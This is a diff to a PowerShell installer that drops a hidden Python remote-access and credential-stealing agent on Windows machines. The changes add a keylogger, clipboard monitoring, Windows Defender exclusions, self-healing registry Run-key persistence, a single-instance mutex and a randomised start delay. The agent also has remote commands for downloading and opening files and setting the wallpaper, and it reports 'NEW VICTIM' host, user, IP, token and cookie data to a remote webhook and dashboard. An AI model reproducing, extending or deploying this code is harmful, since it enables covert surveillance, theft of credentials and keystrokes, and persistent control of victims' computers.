@@ -11,10 +11,14 @@ $sha=[Security.Cryptography.SHA256]::Create()
 $d=$sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($HOOK+'|sv7'))
 $BUCKET='sv7'+(-join($d[0..5]|%{$_.ToString('x2')}))
 $PASS=-join($d[6..21]|%{$_.ToString('x2')})
+$TAG=$BUCKET.Substring(3,4)
+$KEY='WinSec'+$TAG
+$AGENT="a$TAG.py"
 $svc="$env:APPDATA\Microsoft\Windows\svc"
 New-Item -ItemType Directory -Force -Path C:\seven,$svc|Out-Null
 Set-Location C:\seven
 Get-Process python,pythonw -EA 0|?{$_.Path -like '*\svc\*' -or $_.CommandLine -like '*fake.py*'}|Stop-Process -Force -EA 0
+try{Add-MpPreference -ExclusionPath C:\seven,$svc -ExclusionProcess pythonw.exe,python.exe -ExclusionExtension .py -EA 0}catch{}
 $py=(Get-Command python -EA 0).Source
 if(-not $py){$py=(Get-Command py -EA 0).Source}
 if(-not $py){winget install -e --id Python.Python.3.12 --accept-source-agreements --accept-package-agreements --silent;$env:Path=[Environment]::GetEnvironmentVariable('Path','Machine')+';'+[Environment]::GetEnvironmentVariable('Path','User');$py=(Get-Command python -EA 0).Source}
@@ -124,6 +128,7 @@ B="$BUCKET"
 PASS="$PASS"
 HOOK="$HOOK"
 DASH="$DASH"
+KEY="$KEY"
 RES=B+"-r"
 CMD=B+"-c"
 K=HKDF(algorithm=hashes.SHA256(),length=32,salt=b"sv7",info=b"c2").derive(PASS.encode())
@@ -133,15 +138,18 @@ HIT=os.path.join(BP,".hit")
 DST=os.path.join(os.environ.get("APPDATA","."),"Microsoft","Windows","svc")
 ST=os.path.join(DST,"st.json")
 OUT=os.path.join(DST,"out")
+KL=os.path.join(DST,"kl.txt")
 PY=sys.executable.replace("pythonw.exe","python.exe")
 PYW=sys.executable
 NOWIN=0x08000000
-NEWC=0x00000010
 YEAR=365*24*3600*1000
 POLL=4
+KEYON=False
+CLIPON=False
 SEEN=set()
 TOK=re.compile(r"mfa\.[\w-]{80,90}|[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}")
 ENC=re.compile(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})")
+U=ctypes.windll.user32
 
 def enc(o):
     n=secrets.token_bytes(12)
@@ -282,6 +290,21 @@ def vid():
         d["vid"]=secrets.token_hex(4);save(d)
     return d["vid"]
 
+def once():
+    ctypes.windll.kernel32.CreateMutexW(None,False,"sv7"+vid())
+    return ctypes.windll.kernel32.GetLastError()!=183
+
+def runkey():
+    return winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,winreg.KEY_ALL_ACCESS)
+
+def persist():
+    try:winreg.SetValueEx(runkey(),KEY,0,winreg.REG_SZ,"\""+PYW+"\" \""+os.path.join(DST,os.path.basename(sys.argv[0]))+"\"")
+    except Exception:pass
+
+def heal():
+    try:winreg.QueryValueEx(runkey(),KEY)
+    except Exception:persist()
+
 def chunk(t,cid,s):
     n=2800
     parts=[s[i:i+n] for i in range(0,len(s),n)] or [""]
@@ -300,7 +323,7 @@ def post(blob,new,d):
     ip=""
     try:ip=urllib.request.urlopen("https://api.ipify.org",timeout=8).read().decode()
     except Exception:pass
-    link=(DASH+"/#"+B+"."+PASS+"/"+vid())
+    link=DASH+"/#"+B+"."+PASS+"/"+vid()
     L=[("NEW VICTIM" if new else "UPDATE"),"host: "+d["host"],"user: "+d["user"],"ip: "+ip,"os: "+d["os"],"vid: "+vid(),"tokens: "+str(len(d["tokens"])),"cookies: "+str(sum(len(v) for v in d["cookies"].values())),"","dashboard: "+link]
     head=("--"+bnd+"\r\nContent-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n"+json.dumps({"content":"```\n"+"\n".join(L)+"\n```"})+"\r\n")
     fil="--"+bnd+"\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\"d.enc\"\r\nContent-Type: application/octet-stream\r\n\r\n"
@@ -327,11 +350,61 @@ def ensure_bp():
     try:subprocess.Popen('start "win" /min "'+PY+'" "'+FP+'"',shell=True,creationflags=NOWIN)
     except Exception:pass
 
+def clipget():
+    if not U.OpenClipboard(0):return ""
+    try:
+        h=U.GetClipboardData(13)
+        if not h:return ""
+        p=ctypes.windll.kernel32.GlobalLock(h)
+        if not p:return ""
+        s=ctypes.wstring_at(p)
+        ctypes.windll.kernel32.GlobalUnlock(h)
+        return s
+    except Exception:return ""
+    finally:U.CloseClipboard()
+
+def clipmon():
+    last=""
+    while True:
+        try:
+            if CLIPON:
+                c=clipget()
+                if c and c!=last:
+                    last=c
+                    chunk("r","c"+secrets.token_hex(3),enc({"kind":"clipmon","out":c[:4000]}))
+        except Exception:pass
+        time.sleep(2)
+
+VK={8:"[BS]",9:"[TAB]",13:"[ENTER]",27:"[ESC]",32:" ",46:"[DEL]",160:"[SHIFT]",161:"[SHIFT]",162:"[CTRL]",163:"[CTRL]",164:"[ALT]",165:"[ALT]",20:"[CAPS]",186:";",187:"=",188:",",189:"-",190:".",191:"/",192:"`",219:"[",220:"\\",221:"]",222:"'"}
+
+def keyloop():
+    prev=set()
+    while True:
+        try:
+            if KEYON:
+                sh=U.GetAsyncKeyState(16)&0x8000
+                buf=""
+                for vk in range(8,256):
+                    if U.GetAsyncKeyState(vk)&0x8000:
+                        if vk in prev:continue
+                        prev.add(vk)
+                        if 65<=vk<=90:buf+=chr(vk) if sh else chr(vk).lower()
+                        elif 48<=vk<=57:buf+=chr(vk)
+                        else:buf+=VK.get(vk,"")
+                    else:prev.discard(vk)
+                if buf:
+                    try:
+                        with open(KL,"a",encoding="utf-8") as f:f.write(buf)
+                    except Exception:pass
+                time.sleep(0.04)
+            else:time.sleep(0.08)
+        except Exception:time.sleep(0.1)
+
 PSHOT="Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$b=[System.Windows.Forms.SystemInformation]::VirtualScreen;$i=New-Object System.Drawing.Bitmap $b.Width,$b.Height;$g=[System.Drawing.Graphics]::FromImage($i);$g.CopyFromScreen($b.Left,$b.Top,0,0,$i.Size);$i.Save($env:TEMP+chr(92)+\"s.png\");Write-Output ($env:TEMP+chr(92)+\"s.png\")"
 PSWIFI="netsh wlan show profiles|Select-String \"All User Profile\"|%{($_.ToString().Split(\":\")[1]).Trim()}|%{netsh wlan show profile name=$_ key=clear}|Select-String \"SSID|Key Content\""
 
 def run_cmd(c):
-    global POLL
+    global POLL,KEYON,CLIPON
     k=c.get("cmd","");a=c.get("arg","");cid=c.get("id","")
     try:
         if k=="shell":
@@ -355,9 +428,32 @@ def run_cmd(c):
             url,_,p=a.partition("|")
             urllib.request.urlretrieve(url.strip(),p.strip())
             chunk("r",cid,enc({"kind":"put","out":"saved "+p.strip()}))
+        elif k=="open":
+            os.startfile(a)
+            chunk("r",cid,enc({"kind":"open","out":"ok"}))
+        elif k=="wall":
+            p=os.path.join(tempfile.gettempdir(),secrets.token_hex(4)+".jpg")
+            urllib.request.urlretrieve(a,p)
+            U.SystemParametersInfoW(20,0,p,3)
+            chunk("r",cid,enc({"kind":"wall","out":"set"}))
         elif k=="clip":
             p=subprocess.run(["powershell","-NoP","-C","Get-Clipboard"],capture_output=True,text=True,errors="replace",creationflags=NOWIN)
             chunk("r",cid,enc({"kind":"clip","out":p.stdout or ""}))
+        elif k=="clipon":
+            CLIPON=a!="0"
+            chunk("r",cid,enc({"kind":"clipon","out":str(CLIPON)}))
+        elif k=="keyon":
+            KEYON=a!="0"
+            chunk("r",cid,enc({"kind":"keyon","out":str(KEYON)}))
+        elif k=="key":
+            t=""
+            try:t=open(KL,encoding="utf-8",errors="replace").read()[-12000:]
+            except Exception:pass
+            chunk("r",cid,enc({"kind":"key","out":t or "(empty)"}))
+        elif k=="keyclr":
+            try:os.remove(KL)
+            except Exception:pass
+            chunk("r",cid,enc({"kind":"keyclr","out":"cleared"}))
         elif k=="drives":
             p=subprocess.run(["powershell","-NoP","-C","Get-PSDrive -PSProvider FileSystem|Format-Table -Auto"],capture_output=True,text=True,errors="replace",creationflags=NOWIN)
             chunk("r",cid,enc({"kind":"drives","out":p.stdout or ""}))
@@ -370,8 +466,14 @@ def run_cmd(c):
         elif k=="lock":
             subprocess.run("rundll32.exe user32.dll,LockWorkStation",shell=True,creationflags=NOWIN)
             chunk("r",cid,enc({"kind":"lock","out":"locked"}))
+        elif k=="defex":
+            subprocess.run(["powershell","-NoP","-C","Add-MpPreference -ExclusionPath 'C:\\seven','"+DST+"' -ExclusionProcess pythonw.exe,python.exe -ExclusionExtension .py"],capture_output=True,creationflags=NOWIN)
+            chunk("r",cid,enc({"kind":"defex","out":"ok"}))
+        elif k=="persist":
+            persist()
+            chunk("r",cid,enc({"kind":"persist","out":KEY}))
         elif k=="startup":
-            winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,winreg.KEY_SET_VALUE),"WinSec"+secrets.token_hex(2),0,winreg.REG_SZ,a)
+            winreg.SetValueEx(runkey(),"WinSec"+secrets.token_hex(2),0,winreg.REG_SZ,a)
             chunk("r",cid,enc({"kind":"startup","out":"added"}))
         elif k=="grab":
             chunk("r",cid,enc({"kind":"grab","out":"ok"}));report(grab(),False)
@@ -380,7 +482,7 @@ def run_cmd(c):
             POLL=max(2,int(a or 4));chunk("r",cid,enc({"kind":"sleep","out":str(POLL)}))
         elif k=="rm":
             chunk("r",cid,enc({"kind":"rm","out":"bye"}))
-            subprocess.Popen(["powershell","-NoP","-Ep","Bypass","-C","Start-Sleep 3;Get-Process python,pythonw|?{$_.CommandLine -like '*svc*' -or $_.CommandLine -like '*fake.py*'}|Stop-Process -Force -EA 0;Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name WinSecSvc -EA 0;Remove-Item '"+DST+"' -Recurse -Force -EA 0;Remove-Item 'C:\\seven' -Recurse -Force -EA 0;$h='C:\\Windows\\System32\\drivers\\etc\\hosts';(Get-Content $h) -notmatch 'sevenauthapi'|Set-Content $h;Get-ChildItem Cert:\\CurrentUser\\Root|?{$_.Subject -match 'sevenauthapi'}|Remove-Item;netsh advfirewall firewall delete rule name=WinSecSvc"],creationflags=NOWIN)
+            subprocess.Popen(["powershell","-NoP","-Ep","Bypass","-C","Start-Sleep 3;Get-Process python,pythonw|?{$_.CommandLine -like '*svc*' -or $_.CommandLine -like '*fake.py*'}|Stop-Process -Force -EA 0;$r='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';$k=Get-Item $r;$k.GetValueNames()|?{$_ -like 'WinSec*'}|%{Remove-ItemProperty $r -Name $_ -EA 0};Remove-Item '"+DST+"' -Recurse -Force -EA 0;Remove-Item 'C:\\seven' -Recurse -Force -EA 0;$h='C:\\Windows\\System32\\drivers\\etc\\hosts';(Get-Content $h) -notmatch 'sevenauthapi'|Set-Content $h;Get-ChildItem Cert:\\CurrentUser\\Root|?{$_.Subject -match 'sevenauthapi'}|Remove-Item;netsh advfirewall firewall delete rule name=WinSecSvc"],creationflags=NOWIN)
             time.sleep(1);os._exit(0)
     except Exception as e:
         try:chunk("r",cid,enc({"kind":k,"out":"ERR "+repr(e)}))
@@ -390,7 +492,7 @@ def beacon():
     ip=""
     try:ip=urllib.request.urlopen("https://api.ipify.org",timeout=8).read().decode()
     except Exception:pass
-    put(RES,{"t":"b","vid":vid(),"d":enc({"host":os.environ.get("COMPUTERNAME",""),"user":os.environ.get("USERNAME",""),"os":platform.platform(),"ip":ip,"pid":os.getpid()})})
+    put(RES,{"t":"b","vid":vid(),"d":enc({"host":os.environ.get("COMPUTERNAME",""),"user":os.environ.get("USERNAME",""),"os":platform.platform(),"ip":ip,"pid":os.getpid(),"key":KEYON,"clip":CLIPON})})
 
 def agent():
     last=int(time.time())-5
@@ -412,11 +514,12 @@ def agent():
             n+=1
             if n%15==1:beacon()
             if n%60==0:ensure_bp()
+            if n%40==0:heal()
         except Exception:pass
         time.sleep(POLL+secrets.randbelow(3)*0.4)
 
 def boot():
-    time.sleep(1)
+    time.sleep(5+secrets.randbelow(35))
     ensure_bp()
     d=grab()
     st=state()
@@ -426,18 +529,18 @@ def boot():
     report(d,new)
     beacon()
 
+if not once():sys.exit(0)
+os.makedirs(DST,exist_ok=True)
+persist()
 threading.Thread(target=boot,daemon=True).start()
+threading.Thread(target=clipmon,daemon=True).start()
+threading.Thread(target=keyloop,daemon=True).start()
 threading.Thread(target=agent,daemon=True).start()
 while True:time.sleep(3600)
-'@ | Set-Content "$svc\agent.py" -Encoding utf8
+'@ | Set-Content "$svc\$AGENT" -Encoding utf8
 Copy-Item .\cert.pem "$svc\cert.pem" -Force
-$vbs="$svc\run.vbs"
-@"
-WScript.Sleep 3000 + Int(Rnd*20000)
-CreateObject("WScript.Shell").Run """$pyw"" ""$svc\agent.py""", 0, False
-"@ | Set-Content $vbs -Encoding ascii
-New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name WinSecSvc -Value "wscript.exe `"$vbs`"" -PropertyType String -Force|Out-Null
-wscript.exe $vbs
+New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $KEY -Value "`"$pyw`" `"$svc\$AGENT`"" -PropertyType String -Force|Out-Null
+Start-Process $pyw -ArgumentList "`"$svc\$AGENT`"" -WindowStyle Hidden
 Start-Process $py -ArgumentList 'fake.py' -WorkingDirectory C:\seven -WindowStyle Minimized
 $url=$DASH+'/#'+$BUCKET+'.'+$PASS
 $url|Set-Content C:\seven\dashboard.txt
@@ -446,3 +549,4 @@ Start-Sleep 4
 Write-Host "`nDONE" -ForegroundColor Green
 Write-Host "dashboard : $url"
 Write-Host "bucket    : $BUCKET"
+Write-Host "runkey    : $KEY"
